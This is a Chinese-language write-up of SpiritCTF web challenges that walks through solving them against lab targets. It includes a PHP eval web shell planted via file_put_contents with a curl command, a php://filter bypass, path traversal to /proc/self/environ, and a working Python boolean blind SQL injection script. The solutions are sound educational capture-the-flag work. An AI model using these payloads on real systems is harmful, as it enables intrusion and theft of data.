+<p><img src="image-6.png" alt="image-6.png"></p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token variable">$_ENV</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">'Spirit{fake-flag-qwq}'</span><span class="token punctuation">;</span>
+<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'spiritflagqwq'</span><span class="token punctuation">,</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
+<p>发现 <code>flag</code> 信息被写入了 <code>spiritflagqwq</code> 文件中</p>
+<h3 id="3-1-小盲点"><a href="#3-1-小盲点" class="headerlink" title="3.1 小盲点"></a>3.1 小盲点</h3><p>然而做题过程中发<span class="hexo-wm">ꜱ‍‍3𝐯𝐞ｎ．‌ꜱi﻿‌𝘵ｅ​</span>现出题人并没有预先将<code>flag</code>信息写入<code>spiritflagqwq</code>文件中，<br>因此需要先执行一次 <code>flag.php</code> 将flag信息写入 <code>spiritflagqwq</code> 文件中</p>
+<blockquote>
+<p>可以通过不传入arg <code>d</code>,使得其被置为默认值 <code>flag.php</code> 来使得 <code>flag.php</code> 文件被执行</p>
+</blockquote>
+<p>最后将 arg <code>d</code> 设置为 <code>spiritflagqwq</code> 来读取 <code>spiritflagqwq</code> 文件</p>
+<p>得到如下信息：</p>
+<pre class="language-none"><code class="language-none">U3Bpcml0ezFjODJlODRmLWNiOTctNDQ3Ni1iYTI5LTdmZDY2ODcxMGM3MH0=</code></pre>
+<p>经过 <a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64在线加解密工具</a> 解密后得到<br><img src="image-7.png" alt="image-7.png"></p>
+<blockquote>
+<p>Spirit{1c82<span class="hexo-wm">s​3ⅴe𝒏•‌‌ѕ𝐢‍​tｅ‍‌</span>e84f-cb97-<span class="hexo-wm">s‌⑶ⅴℯｎ∙‌si‍‌𝐭ｅ‌‌</span>4476-ba29-7fd668710c70}</p>
+</blockquote>
+<h1 id="ez-Web"><a href="#ez-Web" class="headerlink" title="ez_Web"></a>ez_Web</h1><p>模版套娃题</p>
+<p>题目描述：</p>
+<blockquote>
+<p>Hint: fl<span class="hexo-wm">ꜱ​‍𝟯𝘷𝘦𝒏•‌‌𝘴ｉ‌﻿t𝘦﻿‍</span>ag在/flag里～</p>
+</blockquote>
+<h2 id="1-第一层：301-Redirect"><a href="#1-第一层：301-Redirect" class="headerlink" title="1. 第一层：301 Redirect"></a>1. 第一层：301 Redirect</h2><p>打开页面后显示403 Forbidden，<span class="hexo-wm">s​﻿𝟯𝘷ℯ𝒏•‍‌ꜱｉ‌t℮​</span>提示页面入口不在这里</p>
+<p><img src="image-8.png" alt="image-8.png"></p>
+<p>使用dirsear<span class="hexo-wm">ѕ﻿⑶𝐯ｅ𝒏∙‍𝘴i‍𝘵𝐞‌</span>ch目录工具扫描<br><img src="image-9.png" alt="image-9.png"></p>
+<p>发现两个目录</p>
+<pre class="language-none"><code class="language-none">200 - 382B - /index.html
+200 -  19B - /test.php</code></pre>
+<p>访问 <code>index.html</code></p>
+<p>发现又是 <code>301 Redirect</code></p>
+<p>同 <code>Web - signin</code> 可以用 <code>curl</code> 或 <code>burp suite</code> 方法</p>
+<h3 id="1-1-curl-方法"><a href="#1-1-curl-方法" class="headerlink" title="1.1 curl 方法"></a>1.1 curl 方法</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token punctuation">(</span>SpiritCTF Server URL with port<span class="token punctuation">)</span>/index.html</code></pre>
+<h3 id="1-2-burp-suite-方法"><a href="#1-2-burp-suite-方法" class="headerlink" title="1.2 burp suite 方法"></a>1.2 burp suite 方法</h3><p><img src="image-10.png" alt="image-10.png"><br>得到如下信息</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IE=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>测测你的网速<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
+        window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'test.php'</span>
+        <span class="token comment">//fffff_test.php</span>
+    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre>
+<p>提示我们到 <code>fffff_test.php</code> 中去寻找线索</p>
+<h2 id="2-第二层：GET-传参"><a href="#2-第二层：GET-传参" class="headerlink" title="2. 第二层：GET 传参"></a>2. 第二层：GET 传参</h2><p>访问 <code>fffff_test.php</code> 获得如下信息</p>
+<pre class="language-none"><code class="language-none">什么!?你连JQK都没有?给我一个JQK,我给你一个789。</code></pre>
+<p>根据信息构造 <code>GET</code> 传参：<code>?JQK=789</code></p>
+<h2 id="3-第三层：file-get-contents-利用"><a href="#3-第三层：file-get-contents-利用" class="headerlink" title="3. 第三层：file_get_contents() 利用"></a>3. 第三层：file_get_contents() 利用</h2><p>传参后进入 <code>/fffFfff1ag.php</code> ，得到如下代码</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span></code></pre>
+<p>由于Spirit的flag没有flag标识，因此无需绕过PHP的 <code>preg_match</code></p>
+<p>直接传入 <code>file=/flag</code> 即可</p>
+<h3 id="3-1-PS-preg-match-绕过"><a href="#3-1-PS-preg-match-绕过" class="headerlink" title="3.1 PS: preg_match 绕过"></a>3.1 PS: preg_match 绕过</h3><p>preg_match 对 $content <span class="hexo-wm">ꜱ‍3vｅn.‍‌𝒔i‍𝒕℮​﻿</span>内容的过滤可通过PHP的 <code>Filter</code> 伪协议绕过</p>
+<pre class="language-none"><code class="language-none">php://filter/read=convert.base64-encode/resource=/flag</code></pre>
+<p>通过将flag内容使用base64密文输出，可有效过滤 <code>preg_match</code> 对flag包含的检测</p>
+<p>只需将密文经过 <a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64在线加解密工具</a> 解密即可获得flag</p>
+<p>得到flag</p>
+<pre class="language-none"><code class="language-none">Spirit{eec1fb16-5aa0-4ab2-95c3-dbf3b582be28}</code></pre>
+<p>至此，三层套娃全部结束</p>
+<h1 id="ez-Web2"><a href="#ez-Web2" class="headerlink" title="ez_Web2"></a>ez_Web2</h1><p><del>又是套娃题(误)</del></p>
+<p>题目描述：</p>
+<blockquote>
+<p>Hint: robots</p>
+</blockquote>
+<h2 id="1-第一层：robots-泄露"><a href="#1-第一层：robots-泄露" class="headerlink" title="1. 第一层：robots 泄露"></a>1. 第一层：robots 泄露</h2><p>打开页面后显示</p>
+<pre class="language-none"><code class="language-none">系统维护中，暂未开放</code></pre>
+<p>根据 Hint<span class="hexo-wm">𝐬​⑶ⅴℯ𝐧․‍‍𝒔ｉ​﻿ｔｅ‌</span> 内容访问 <code>/robots.txt</code> ，得到如下信息：</p>
+<pre class="language-none"><code class="language-none">User-Agent: *
+Disallow: login.php</code></pre>
+<h2 id="2-第二层：弱密码爆破"><a href="#2-第二层：弱密码爆破" class="headerlink" title="2. 第二层：弱密码爆破"></a>2. 第二层：弱密码爆破</h2><p>根据提示访问 <code>login.php</code></p>
+<p><img src="image-11.png" alt="image-11.png"></p>
+<p>发现一个登录框，<span class="hexo-wm">ꜱ​⑶𝘷𝐞n․​𝘴𝐢﻿𝐭𝘦‌‍</span>进行弱密码尝试</p>
+<p>尝试后发现</p>
+<blockquote>
+<p>用户名：admin<br>密码：123456</p>
+</blockquote>
+<h2 id="3-第三层：file-put-contents-利用"><a href="#3-第三层：file-put-contents-利用" class="headerlink" title="3. 第三层：file_put_contents() 利用"></a>3. 第三层：file_put_contents() 利用</h2><p>登录后返回如下PHP代码</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'请先登录'</span><span class="token punctuation">;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token delimiter important">?&gt;</span></span></code></pre>
+<p>观察到函数 <code>file_put_contents</code> 可控，考虑使用 <span class="hexo-wm">𝒔‌‌⑶v𝐞𝒏·‌𝐬i‌​ｔ𝐞﻿</span>Web Shell</p>
+<p>由于此处 <code>str_replace</code> 的调用没有把返回值赋回给 <code>data</code> ，所以此行代码无效</p>
+<p>构造参数如下( <span class="hexo-wm">ѕ​⑶𝘷e𝘯．​ѕｉ‍ｔ℮﻿‌</span>注意使用POST方法传参 )：</p>
+<pre class="language-none"><code class="language-none">?filename=shell.php&amp;data=&lt;?php eval(@$_POST['shell']); ?&gt;</code></pre>
+<h3 id="3-1-HackBar"><a href="#3-1-HackBar" class="headerlink" title="3.1 HackBar"></a>3.1 HackBar</h3><p>登录过后无需携带 <code>Cookies</code></p>
+<p><img src="image-12.png" alt="image-12.png"></p>
+<h3 id="3-2-curl"><a href="#3-2-curl" class="headerlink" title="3.2 curl"></a>3.2 curl</h3><p>注意携带登录过后的PHP<span class="hexo-wm">s﻿‌⑶𝒗𝐞𝐧.‍s𝘪‍﻿ｔ𝘦﻿‌</span>SESSID作为Cookies</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-d</span> <span class="token string">"filename=shell.php&amp;data=&lt;?php eval(@<span class="token variable">$_POST</span>['shell']); ?&gt;"</span> <span class="token parameter variable">-b</span> <span class="token string">"PHPSESSID=xxxx"</span> <span class="token punctuation">(</span>SpiritCTF Server URL with port<span class="token punctuation">)</span>/ffffffLag.php</code></pre>
+
+<p>Web Shell <span class="hexo-wm">s​​⑶ⅴ𝐞n•​﻿𝘴𝘪﻿te‍</span>生成完毕后使用 <code>中国蚁剑antSword</code> 连接靶机</p>
+<p>注意此处连接密码为 <code>data</code> 中 <code>POST</code> 的参数名称</p>
+<p><img src="image-13.png" alt="image-13.png"></p>
+<p>进入根目录即可找到 <code>flag</code></p>
+<p><img src="image-14.png" alt="image-14.png"></p>
+<p>Flag:</p>
+<blockquote>
+<p>Spirit{30df4f45-<span class="hexo-wm">s﻿﻿⑶ⅴｅ𝘯.‍𝘀ｉ‌‌𝒕𝘦‍</span>adf4-478d-a90a-00e3f91877c7}</p>
+</blockquote>
+<h3 id="3-3-PS-str-replace-绕过方法"><a href="#3-3-PS-str-replace-绕过方法" class="headerlink" title="3.3 PS: str_replace 绕过方法"></a>3.3 PS: str_replace 绕过方法</h3><p><code>str_replace</code> 可使用双写绕过，例如：</p>
+<pre class="language-php" data-language="php"><code class="language-php">data <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>可以通过以下方式绕过</p>
+<pre class="language-php" data-language="php"><code class="language-php">data <span class="token operator">=</span> pphphp</code></pre>
+<p>此处 <code>str_replace</code> 函数将 <code>p{php}hp</code> 中花括号部分替<span class="hexo-wm">𝘀‌​⑶𝒗𝘦ｎ․﻿‍ꜱi​𝒕℮​﻿</span>换为空字符串，</p>
+<p>最后仍剩余 <code>php</code> ，从而达到绕过效果</p>
+<h1 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h1><p>题目描述:</p>
+<blockquote>
+<p>Hint: sql盲注</p>
+</blockquote>
+<p>打开页面发现有一<span class="hexo-wm">s‌³ve𝘯．​ꜱⅈ﻿​𝒕e‍﻿</span>个认证登录界面</p>
+<p><img src="image-15.png" alt="image-15.png"></p>
+<p>根据提示sql盲注得知</p>
+<p>我们无法通过显性方式直接获取数据，<span class="hexo-wm">ѕ﻿³𝐯ｅ𝘯·​​𝒔ｉ‍tｅ‍​</span>但可以通过不同输入的回显值不同来判断输入条件是否成立</p>
+<p>因此我们尝试判断条件 <code>True</code> 和 <code>False</code> 的回显值区别</p>
+<blockquote>
+<p>经过初步尝试发现屏蔽了空格的输入，<span class="hexo-wm">ꜱ﻿⑶𝐯e𝘯.<span class="hexo-wm">𝘀​​𝟯v𝘦𝒏.​​s𝘪​𝘵e​‍</span>‍𝘀i﻿𝒕℮﻿</span>若包含空格则会 <code>alert Hack!</code></p>
+<p>此处使用 <code>/**/</code> 替换空格，以<span class="hexo-wm">ѕ﻿𝟯𝐯𝘦𝐧∙‌﻿s𝘪​𝘵ｅ‌</span>绕过空格屏蔽</p>
+</blockquote>
+<p>由于登录界面的sql注入应为字符型注入，因此分别尝试使用以下表单进行测试</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">username<span class="token operator">=</span>admin'<span class="token comment">/**/</span>and<span class="token comment">/**/</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">0</span>#
+password<span class="token operator">=</span><span class="token number">123</span>
+
+alert 用户名不存在<span class="token operator">!</span></code></pre>
+
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">username<span class="token operator">=</span>admin'<span class="token comment">/**/</span>and<span class="token comment">/**/</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>#
+password<span class="token operator">=</span><span class="token number">123</span>
+
+alert 密码错误<span class="token operator">!</span></code></pre>
+
+<p>根据 <code>alert</code> 的内容可以判断出网页后端对<span class="hexo-wm">𝘀​³𝘷𝐞𝐧•‍﻿ѕi﻿ｔ𝐞‍</span>登录表单的校验是用户名与密码分离的</p>
+<p>即先进行用户名存在性校验，<span class="hexo-wm">𝘴​​𝟯𝐯𝘦𝒏∙​𝘴ⅈ‌​𝒕𝘦‌‍</span>再进行密码正确性校验</p>
+<p>这种设置给了我们实现 <code>sql布尔盲注</code> 的可能</p>
+<p>只需构造 <code>username</code> 的 <code>payload</code> ，就可以根据<span class="hexo-wm">𝘀‌³ve𝘯․﻿s𝘪﻿𝒕𝐞﻿​</span>回显值的不同判断 <code>payload</code> 中的构造条件是否成立</p>
+<p>因此数据长度可以通过 <code>length()</code> 函数并枚举长度进行比对来判断<br>数据内容可以通过使用 <code>substr()</code> 、 <code>mid()</code> 、 <code>substring()</code> 等函数对数据中的字符逐个进行截取并与字符表比对来读取</p>
+<p>sql数据截取函数使用说明如下：</p>
+<blockquote>
+<p>substr(string, start, length)：将 string 从 start 开始的位置，截取 length 个字符<br>mid(string, start, length)：将 string 从 start 开始的位置，截取 length 个字符<br>substring(string, start, <span class="hexo-wm">s‍﻿⑶𝘷𝐞𝘯․‍s𝘪‍𝐭℮‌</span>length)：将 string 从 <span class="hexo-wm">𝒔​‌𝟯ⅴ𝐞𝐧․​𝘴𝐢​﻿𝐭℮‍</span>start 开始的位置，截取 length 个字符</p>
+</blockquote>
+<p>构造 <code>payload</code> 有效载荷 如下:</p>
+<pre class="language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">"admin'/**/and/**/length(({0}))={1}#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data_payload<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token comment">#判断数据长度</span>
+payload <span class="token operator">=</span> <span class="token string">"admin'and/**/ascii(substr(({0}),{1},1))={2}#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data_payload<span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#逐字符读取数据内容</span>
+其中 data_payload 为可输出数据内容的语句 <span class="token punctuation">(</span>select语句等<span class="token punctuation">)</span></code></pre>
+
+<p>构造 <code>Python</code> 攻击代码如下</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+ 
+chars <span class="token operator">=</span> <span class="token string">"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@&amp;%/^!~{}"</span> <span class="token comment">#常用字符表</span>
+result <span class="token operator">=</span> <span class="token string">""</span>
+
+<span class="token comment">#判断字符串长度</span>
+<span class="token keyword">def</span> <span class="token function">get_length</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        payload <span class="token operator">=</span> <span class="token string">"admin'/**/and/**/length(({0}))={1}#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data_payload<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
+        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"123"</span><span class="token punctuation">}</span>
+        html <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+        length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>html<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> length <span class="token operator">==</span> value<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The data length is: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span>  n
+ 
+<span class="token comment">#读取字符串内容</span>
+<span class="token keyword">def</span> <span class="token function">get_data</span><span class="token punctuation">(</span>data_length<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">global</span> result
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>data_length<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> char <span class="token keyword">in</span> chars<span class="token punctuation">:</span>
+            payload <span class="token operator">=</span> <span class="token string">"admin'and/**/ascii(substr(({0}),{1},1))={2}#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data_payload<span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span>
+            data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">}</span>
+            html <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+            length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>html<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> length <span class="token operator">==</span> value<span class="token punctuation">:</span>
+                result <span class="token operator">+=</span> char
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Reading data: "</span> <span class="token operator">+</span> result<span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+ 
+ 
+url <span class="token operator">=</span> <span class="token string">"(SpiritCTF Server URL with port)/index.php"</span>
+data_payload <span class="token operator">=</span> <span class="token string">"xxxx"</span>
+value <span class="token operator">=</span> <span class="token number">3297</span> <span class="token comment">#此处应根据实际设置为payload构造条件成立时response的长度</span>
+ 
+length <span class="token operator">=</span> get_length<span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">1</span>
+get_data<span class="token punctuation">(</span>length<span class="token punctuation">,</span>value<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The data is: "</span> <span class="token operator">+</span> result<span class="token punctuation">)</span></code></pre>
+
+<p>由于不知道 <code>flag</code> 内容的存放位置，应先对存放着 <code>flag</code> 内容的数据库名、数据表名、<span class="hexo-wm">𝐬﻿³𝐯e𝒏∙​‍𝒔𝐢﻿​te﻿‍</span>字段名进行读取，最后再读取 <code>flag</code> 内容</p>
+<h2 id="1-读取数据库名"><a href="#1-读取数据库名" class="headerlink" title="1. 读取数据库名"></a>1. 读取数据库名</h2><pre class="language-python" data-language="python"><code class="language-python">data_payload <span class="token operator">=</span> <span class="token string">"database()"</span></code></pre>
+
+<p>输出内容如下：</p>
+<p><img src="image-16.png" alt="image-16.png"></p>
+<p>得到数据库名为 <code>jluCTF</code></p>
+<h2 id="2-读取数据表名（默认第一张表）"><a href="#2-读取数据表名（默认第一张表）" class="headerlink" title="2. 读取数据表名（默认第一张表）"></a>2. 读取数据表名（默认第一张表）</h2><pre class="language-python" data-language="python"><code class="language-python">data_payload <span class="token operator">=</span> <span class="token string">"select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema='jluCTF'/**/limit/**/0,1"</span></code></pre>
+
+<p>输出内容如下：</p>
+<p><img src="image-17.png" alt="image-17.png"></p>
+<p>得到数据表名为 <code>flag</code></p>
+<h2 id="3-读取字段名-默认第一个字段"><a href="#3-读取字段名-默认第一个字段" class="headerlink" title="3. 读取字段名 (默认第一个字段)"></a>3. 读取字段名 (默认第一个字段)</h2><pre class="language-python" data-language="python"><code class="language-python">data_payload <span class="token operator">=</span> <span class="token string">"select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema='jluCTF'/**/and/**/table_name='flag'/**/limit/**/0,1"</span></code></pre>
+<p><img src="image-18.png" alt="image-18.png"></p>
+<p>得到字段名为 <code>flag</code></p>
+<h2 id="4-读取-flag-内容"><a href="#4-读取-flag-内容" class="headerlink" title="4. 读取 flag 内容"></a>4. 读取 <code>flag</code> 内容</h2><pre class="language-python" data-language="python"><code class="language-python">data_payload <span class="token operator">=</span> <span class="token string">"select/**/flag/**/from/**/flag"</span></code></pre>
+
+<p>输出内容如下：</p>
+<p><img src="image-19.png" alt="image-19.png"></p>
+<p>得到 <code>flag</code> ：</p>
+<pre class="language-none"><code class="language-none">Spirit{64e90c7c-e9bc-4809-aa91-ade46ceffbb1}</code></pre>
+
+<h1 id="pin-pin-revenge"><a href="#pin-pin-revenge" class="headerlink" title="pin &amp; pin_revenge"></a>pin &amp; pin_revenge</h1><p>pin 题目描述：</p>
+<blockquote>
+<p>PIN~PON!</p>
+</blockquote>
+<p>打开页面后发现跳转到了 <code>/?location=index.html</code></p>
+<p>页面显示 <code>qwq</code> （？）<br><img src="image-20.png" alt="image-20.png"></p>
+<p>经过测试发现 <code>/?location=</code> 处存在任意文件读取漏洞</p>
+<h2 id="1-非预期解-仅pin题内存在"><a href="#1-非预期解-仅pin题内存在" class="headerlink" title="1. 非预期解 (仅pin题内存在)"></a>1. 非预期解 (仅pin题内存在)</h2><p>由于该题的环境<span class="hexo-wm">ꜱ﻿3𝒗𝐞𝐧∙​ѕ𝐢​‍𝘵ｅ​​</span>变量没有删除干净，</p>
+<p>因此可以从当前进程<span class="hexo-wm">s‍³ⅴ𝐞n．﻿ѕi​𝒕𝐞﻿‍</span>的环境变量文件中读取 <code>flag</code> 内容</p>
+<p><code>payload</code> 如下:</p>
+<pre class="language-none"><code class="language-none">/?location=../../../../../../proc/self/environ</code></pre>
+<p>页面返回如下内容：</p>
+<pre class="language-none"><code class="language-none">PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=20be9d370cb1FLAG=Spirit{badd44f8-94eb-4648-b5d3-cdf837431e52}LANG=C.UTF-8GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696DPYTHON_VERSION=3.11.3PYTHON_PIP_VERSION=22.3.1PYTHON_SETUPTOOLS_VERSION=65.5.1PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/0d8570dc44796f4369b652222cf176b3db6ac70e/public/get-pip.pyPYTHON_GET_PIP_SHA256=96461deced5c2a487ddc65207ec5a9cffeca0d34e7af7ea1afc470ff0d746207HOME=/rootWERKZEUG_SERVER_FD=3WERKZEUG_RUN_MAIN=true</code></pre>
+
+<p>从中获得 <code>pin</code> 题的 <code>flag</code> 如下：</p>
+<pre class="language-none"><code class="language-none">Spirit{badd44f8-94eb-4648-b5d3-cdf837431e52}</code></pre>
+
